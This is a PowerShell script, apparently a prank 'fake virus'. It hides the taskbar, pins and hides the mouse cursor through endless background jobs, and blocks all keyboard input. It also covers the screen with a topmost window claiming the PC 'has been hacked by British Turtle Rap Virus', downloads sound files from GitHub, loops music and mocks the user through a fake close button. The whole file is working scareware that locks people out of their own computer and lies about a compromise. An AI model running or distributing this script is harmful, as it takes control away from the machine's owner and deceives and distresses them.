Add-Type -AssemblyName PresentationFramework, PresentationCore, WindowsBase

# === Windows API: Hide taskbar + Lock mouse ===
Add-Type @"
using System;
using System.Runtime.InteropServices;
public class NativeMethods {
    [DllImport("user32.dll")]
    public static extern int FindWindow(string lpClassName, string lpWindowName);
    [DllImport("user32.dll")]
    public static extern int ShowWindow(int hwnd, int nCmdShow);

    [DllImport("user32.dll")]
    public static extern bool ClipCursor(ref RECT rect);
    [DllImport("user32.dll")]
    public static extern bool ClipCursor(IntPtr rect);

    [StructLayout(LayoutKind.Sequential)]
    public struct RECT {
        public int Left;
        public int Top;
        public int Right;
        public int Bottom;
    }
}
"@

# === Hide Taskbar ===
$taskbarHwnd = [NativeMethods]::FindWindow("Shell_TrayWnd", "")
if ($taskbarHwnd -ne 0) {
    [NativeMethods]::ShowWindow($taskbarHwnd, 0)
}

# === Lock Mouse to screen center ===
function Lock-Mouse {
    $screenWidth = [System.Windows.SystemParameters]::PrimaryScreenWidth
    $screenHeight = [System.Windows.SystemParameters]::PrimaryScreenHeight

    $rect = New-Object NativeMethods+RECT
    $rect.Left = [int]($screenWidth / 2)
    $rect.Top = [int]($screenHeight / 2)
    $rect.Right = $rect.Left + 1
    $rect.Bottom = $rect.Top + 1

    [NativeMethods]::ClipCursor([ref]$rect) | Out-Null
}

# === Background job to loop-lock mouse ===
$LockJob = {
    Add-Type @"
    using System;
    using System.Runtime.InteropServices;
    public class NativeMethods {
        [StructLayout(LayoutKind.Sequential)]
        public struct RECT {
            public int Left;
            public int Top;
            public int Right;
            public int Bottom;
        }

        [DllImport("user32.dll")]
        public static extern bool ClipCursor(ref RECT rect);
    }
"@
    while ($true) {
        $w = [System.Windows.SystemParameters]::PrimaryScreenWidth
        $h = [System.Windows.SystemParameters]::PrimaryScreenHeight

        $r = New-Object NativeMethods+RECT
        $r.Left = [int]($w / 2)
        $r.Top = [int]($h / 2)
        $r.Right = $r.Left + 1
        $r.Bottom = $r.Top + 1

        [NativeMethods]::ClipCursor([ref]$r) | Out-Null
        Start-Sleep -Milliseconds 500
    }
}
Start-Job -ScriptBlock $LockJob | Out-Null

# === Background job to loop-hide mouse ===
$HideMouseJob = {
    Add-Type -AssemblyName PresentationCore
    while ($true) {
        [System.Windows.Input.Mouse]::OverrideCursor = [System.Windows.Input.Cursors]::None
        Start-Sleep -Milliseconds 500
    }
}
Start-Job -ScriptBlock $HideMouseJob | Out-Null

# === GUI Setup ===
$Window = New-Object System.Windows.Window
$Window.WindowStyle = 'None'
$Window.ResizeMode = 'NoResize'
$Window.WindowStartupLocation = 'CenterScreen'
$Window.Background = 'Black'
$Window.Topmost = $true
$Window.WindowState = 'Maximized'
$Window.Title = "System Alert"
$Window.AllowsTransparency = $false
$Window.Cursor = [System.Windows.Input.Cursors]::Arrow  # Visible initially

# === Block keyboard input ===
$Window.Add_PreviewKeyDown({ param($s,$e) $e.Handled = $true })
$Window.Add_PreviewTextInput({ param($s,$e) $e.Handled = $true })

# === Warning Text ===
$TextBlock = New-Object System.Windows.Controls.TextBlock
$TextBlock.Text = "Your PC has been hacked by British Turtle Rap Virus"
$TextBlock.Foreground = 'Red'
$TextBlock.FontSize = 48
$TextBlock.FontWeight = 'Bold'
$TextBlock.FontFamily = 'Consolas'
$TextBlock.HorizontalAlignment = 'Center'
$TextBlock.VerticalAlignment = 'Center'
$TextBlock.TextAlignment = 'Center'
$TextBlock.TextWrapping = 'Wrap'

# === Fake Close Button ===
$FakeClose = New-Object System.Windows.Controls.Button
$FakeClose.Content = "X"
$FakeClose.Width = 40
$FakeClose.Height = 40
$FakeClose.HorizontalAlignment = 'Right'
$FakeClose.VerticalAlignment = 'Top'
$FakeClose.Margin = '0,10,10,0'
$FakeClose.Foreground = 'Red'
$FakeClose.Background = 'Transparent'
$FakeClose.BorderBrush = 'Red'
$FakeClose.FontWeight = 'Bold'
$FakeClose.FontSize = 18
$FakeClose.Cursor = 'Arrow'

# === Download Sound Files ===
$musicUrl = "https://raw.githubusercontent.com/coolman6969-ui/turtle-rap/main/british%20turtle%20rapping.mp3"
$nopeUrl  = "https://raw.githubusercontent.com/coolman6969-ui/turtle-rap/main/Nope%20sound%20effect.mp3"

$musicPath = "$env:APPDATA\british_turtle_rap.mp3"
$nopePath  = "$env:APPDATA\nope_effect.mp3"

if (-not (Test-Path $musicPath)) {
    Invoke-WebRequest -Uri $musicUrl -OutFile $musicPath -UseBasicParsing
}
if (-not (Test-Path $nopePath)) {
    Invoke-WebRequest -Uri $nopeUrl -OutFile $nopePath -UseBasicParsing
}

# === Background Music ===
Start-Job -ScriptBlock {
    Add-Type -AssemblyName presentationcore
    $player = New-Object System.Windows.Media.MediaPlayer
    $player.Volume = 1.0
    while ($true) {
        $player.Open([Uri]::new("$using:musicPath"))
        $player.Play()
        Start-Sleep -Seconds 10
        $player.Stop()
    }
} | Out-Null

# === Custom messagebox ===
function Show-FakeMessageBox {
    param($message, $title)

    Add-Type -AssemblyName PresentationFramework

    $msgWindow = New-Object System.Windows.Window
    $msgWindow.Title = $title
    $msgWindow.Width = 300
    $msgWindow.Height = 150
    $msgWindow.WindowStartupLocation = 'CenterOwner'
    $msgWindow.ResizeMode = 'NoResize'
    $msgWindow.WindowStyle = 'SingleBorderWindow'
    $msgWindow.Topmost = $true
    $msgWindow.Owner = $Window
    $msgWindow.Background = 'White'

    $stack = New-Object System.Windows.Controls.StackPanel
    $stack.Margin = '10'

    $textBlock = New-Object System.Windows.Controls.TextBlock
    $textBlock.Text = $message
    $textBlock.TextWrapping = 'Wrap'
    $textBlock.Margin = '0,0,0,10'
    $textBlock.FontSize = 16
    $textBlock.HorizontalAlignment = 'Center'
    $textBlock.TextAlignment = 'Center'

    $okButton = New-Object System.Windows.Controls.Button
    $okButton.Content = 'OK'
    $okButton.Width = 80
    $okButton.HorizontalAlignment = 'Center'
    $okButton.Add_Click({ $msgWindow.DialogResult = $true })

    $stack.Children.Add($textBlock)
    $stack.Children.Add($okButton)
    $msgWindow.Content = $stack
    $msgWindow.ShowDialog() | Out-Null
}

# === Fake Close Button Behavior ===
$FakeClose.Add_Click({
    Add-Type -AssemblyName presentationcore
    $nopePlayer = New-Object System.Windows.Media.MediaPlayer
    $nopePlayer.Open([Uri]::new("$nopePath"))
    $nopePlayer.Volume = 1.0
    $nopePlayer.Play()

    Show-FakeMessageBox "nuh uh, I'm locking your mouse now" "Denied"
    $Window.Cursor = [System.Windows.Input.Cursors]::None
    $Grid.Children.Remove($FakeClose)
})

# === Layout Setup ===
$Grid = New-Object System.Windows.Controls.Grid
$Grid.Children.Add($TextBlock)
$Grid.Children.Add($FakeClose)
$Window.Content = $Grid

# === Show Window ===
$Window.ShowDialog()
